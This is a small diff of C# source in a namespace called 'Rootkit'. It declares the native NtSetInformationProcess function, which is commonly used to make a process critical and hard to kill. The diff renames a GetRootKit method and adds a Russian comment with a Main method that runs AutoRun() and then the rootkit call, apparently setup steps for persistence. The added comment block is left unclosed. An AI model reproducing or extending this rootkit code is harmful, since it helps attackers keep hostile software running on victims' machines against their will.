@@ -14,7 +14,7 @@ namespace Rootkit
 
 	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
 
-	public static bool GetRootkit()
+	public static bool GetRootKit()
 	{
 		try
 		{
@@ -26,4 +26,11 @@ namespace Rootkit
 		}
 		catch { return false; }
 	}
+}
+// В основной программе нужно прописать
+/*
+static void Main(string[] args)
+{
+	AutoRun();
+	cRoot.GetRootKit();
 }
